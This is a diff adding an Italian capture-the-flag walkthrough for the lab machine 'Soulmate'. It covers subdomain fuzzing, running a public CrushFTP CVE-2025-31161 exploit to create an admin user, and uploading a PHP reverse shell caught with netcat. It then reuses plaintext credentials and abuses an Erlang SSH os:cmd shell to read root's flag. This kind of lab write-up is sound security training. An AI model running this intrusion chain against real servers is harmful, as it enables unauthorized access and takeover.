@@ -90,3 +90,60 @@ IP: 10.10.11.87
   d3d33e456c1467b***************
 
 ######################################################################################################################
+
+# Machine 'Soulmate'
+IP 10.10.11.86
+
+Scansione iniziale: porte HTTP e SSH esposte.
+Web app con funzionalità: login / register / upload / bio — nulla di immediatamente sfruttabile via UI.
+Scoperta sottodominio tramite Host header fuzzing:
+
+  ffuf -u http://10.10.11.86 -H "Host: FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
+
+Trovato: ftp.soulmate.htb → aggiunto in /etc/hosts
+Visitando ftp.soulmate.htb viene mostrata una login page di CrushFTP (/WebInterface/login.html).
+Ricerca CVE pubbliche per CrushFTP → trovato exploit per CVE-2025-31161 che permette bypass/creazione utente.
+
+  git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161
+  cd CVE-2025-31161
+  python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password admin123
+
+Exploit eseguito con successo → creato utente 'test'.
+Login al pannello CrushFTP con utenza creata; in UserManager individuati utenti d'interesse: ben, jenna.
+Cambiata password di 'ben' per uso successivo.
+
+Il pannello consente upload di file nella directory della web‑app → upload di una reverse shell PHP.
+Avviato listener e richiamata la webshell → ottenuta shell come www-data:
+
+  nc -lnvp 4444
+  listening on [any] 4444 ...
+  connect to [10.10.14.59] from (UNKNOWN) [10.10.11.86] 44832
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  /bin/sh: 0: can't access tty; job control turned off
+  $ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Eseguita enumerazione locale automatica (linpeas) per trovare possibili escalation:
+LinPEAS segnala processo Erlang in esecuzione come root:
+
+  root        3486  0.0  1.7 2256180 71100 ?       Ssl  05:22   0:05 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
+
+In un file di configurazione associato al processo trovato credenziali in chiaro: {user_passwords, [{"ben", "HouseH0ldings998"}]}, che ci permetterà di loggarci in ssh.
+
+  ben@soulmate:~$ cat user.txt
+  81b8219692204e627**************
+
+  ben@soulmate:~$ sudo -l
+  [sudo] password for ben:
+  Sorry, user ben may not run sudo on soulmate.
+
+LinPEAS segnala anche un servizio Erlang SSH (ssh_runner) in ascolto su porta 2222.
+Uso le credenziali trovate per connettermi al servizio Erlang SSH locale:
+
+  ben@soulmate:~$ ssh ben@localhost -p 2222
+  Password: HouseH0ldings998
+
+Nell'Erlang shell è presente la funzione os:cmd/1 che esegue comandi di sistema.
+
+  (ssh_runner@soulmate)1> os:cmd("cat /root/root.txt").
+  "901bcec346798259***************\n"
+  (ssh_runner@soulmate)2> 
